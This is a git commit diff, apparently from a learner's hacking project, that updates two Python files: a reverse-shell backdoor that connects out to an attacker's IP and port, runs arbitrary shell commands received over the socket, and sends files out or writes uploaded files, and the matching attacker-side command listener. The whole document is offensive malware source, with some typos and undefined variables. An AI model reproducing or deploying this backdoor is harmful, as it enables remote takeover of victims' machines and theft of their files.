d387a71d4a575218d99fd1e32e92d304c23a1ce3
V1ZEI-CN <vijaychowdary3699@gmail.com>
2021-12-18 15:43:42 +0530

    noob mr.robot | backdoor

--- backdoor/reverseBackdoor.py
+++ backdoor/reverseBackdoor.py
@@ -3,48 +3,69 @@
 
 # ------------------------------- start of code -----------------------------
 
-import sys
+import os
 import json
 import socket
+import base64
 import subprocess
 
 class Suspicious:
-  def __init__(self, ip, port):
-    self.connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    self.connection.connect((ip, port))
-    self.connetion.send("[+] Connection Success.\n".encode('utf-8'))
-  
-  def execute_system_commands(self, command):
-    # the output data type of the check_output method is byte
-    return subprocess.check_output(command, shell=True).decode('utf-8')
-  
-  def receive_data(self):
-    json_data = ""
-    while True:
-      try:
-        json_data += self.connetion.recv(1024).decode('utf-8')
-        return json.loads(json_data)
-      except ValueError:
-        continue
-  
-  def send_data(self, data):
-    json_data = json.dumps(data)
-    self.connetion.send(json_data.encode('utf-8'))
-  
-  def start(self):
-    while True:
-      try:
-        data_received = self.connetion.recv(1024).decode('utf-8')
-        command_result = self.execute_system_commands(data_received)
-        self.connetion.send(command_result)
-      except subprocess.CalledProcessError as error:
-        self.connetion.send(error)
-        sys.exit()
-      except KeyboardInterrupt as error:
-        data = "\r[+] Keyboard Interrpution, quitting the program\n"
-        self.connetion.send(data.encode('utf-8'))
-        sys.exit()
-    self.connetion.close()
+    def __init__(self, ip, port):
+        self.connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+        self.connetion.send("[+] Connection Success.\n".encode('utf-8'))
+
+    def execute_system_commands(self, command):
+        # the output data type of the check_output method is byte
+        return subprocess.check_output(command, shell=True).decode('utf-8')
+
+    def changeWorkingDirectory(self, path):
+        os.chdir(path)
+        return "[+] Changed current working folder to " + str(path)
+
+    def read_file(self, path):
+        with open(path, 'rb') as file:
+            return base64.b64encode(file.read())
+
+    def download_file(self, path, content):
+        with open(path, 'wb') as file:
+            file.write(base64.b64decode(content))
+            return "[+] File upload success"
+
+    def receive_data(self):
+        json_data = ""
+        while True:
+            try:
+                json_data += self.connetion.recv(1024).decode('utf-8')
+                return json.loads(json_data)
+            except ValueError:
+                continue
+
+    def send_data(self, data):
+        json_data = json.dumps(data)
+        self.connetion.send(json_data.encode('utf-8'))
+
+    def start(self):
+        while True:
+            try:
+                data_received = self.receive_data()
+                if data_received[0].lower() == 'exit':
+                    self.connetion.close()
+                    exit()
+                elif data_received[0].lower() == 'cd' and len(data_received) >1:
+                    command_result = self.changeWorkingDirectory(data_received[1])
+                elif data_received[0].lower() == 'download':
+                    command_result = self.read_file(data_received[1])
+                elif data_received[0].lower() == 'upload':
+                    command_result = self.download_file(data_received[1], data_received[2])
+                else:
+                    command_result = self.execute_system_commands(data_received)
+                self.send_data(command_result)
+            except subprocess.CalledProcessError as error:
+                self.send_data("-------[=] Error => subprocess.CalledProcessError [=] -------")
+            except Exception as error:
+                self.send_data("---- [=] Error while executing command [=] ----")
+                self.send_data("---- [=] Connection is still intact though [=] ----")
 
 # these ip and port values are of hackers system values
 backdoor = Suspicious(ip, port)
--- backdoor/server_listener.py
+++ backdoor/server_listener.py
@@ -1,38 +1,59 @@
-import socket
 import json
+import base64
+import socket
 
 class Connections_Listener:
-  def __init__(self, ip, port):
-    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    listener.bind((ip, port))
-    listener.listen(0)
-    print("[+] Waiting for a connection")
-    self.connection, address = listener.accept()
-    print("[+] Got a connection")
-  
-  def send_data(self, data):
-    json_data = json.dumps(data)
-    self.connection.send(json_data.encode('utf-8'))
-  
-  def receive_data(self):
-    json_data = ""
-    while True:
-      try:
-        json_data += self.connection.recv(1024).decode('utf-8')
-        return json.loads(json_data)
-      except ValueError:
-        continue
-  
-  def remote_code_execution(self, command):
-    self.send_data(command)
-    return self.receive_data()
-  
-  def start(self):
-    while True:
-      input_command = input(">>> ")
-      result = self.remote_code_execution(input_command)
-      print(result)
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Waiting for a connection")
+        self.connection, address = listener.accept()
+        print("[+] Got a connection" + str(address))
+    
+    def send_data(self, data):
+        json_data = json.dumps(data)
+        self.connection.send(json_data.encode('utf-8'))
+    
+    def receive_data(self):
+        json_data = ""
+        while True:
+            try:
+                json_data += self.connection.recv(1024).decode('utf-8')
+                return json.loads(json_data)
+            except ValueError:
+                continue
+    
+    def remote_code_execution(self, command):
+        self.send_data(command)
+        if command[0].lower() == 'exit':
+            self.connection.close()
+            exit()
+        return self.receive_data()
+    
+    def download_file(self, path, content):
+        with open(path, 'wb') as file:
+            file.write(base64.b64decode(content))
+            return "[+] File download successful"
+    
+    def upload_files(eslf, path):
+        with open(path, 'rb') as file:
+            return base64.b64encode(file.read())
+
+    def start(self):
+        while True:
+            try:
+                input_command = input(">>> ").split(" ")
+                if input_command[0].lower() == 'upload':
+                    content = self.upload_files(input_command[1]).decode()
+                    input_command.append(content)
+                result = self.remote_code_execution(input_command)
+                if input_command[0].lower() == 'download':
+                    result = self.download_file(input_command[1], result.encode('utf-8'))
+            except Exception as error:
+                print(error)
+                print("\n\n----- [=] Connection is still intact [=] -----")
 
 listen = Connections_Listener(ip, port)
 listen.start()
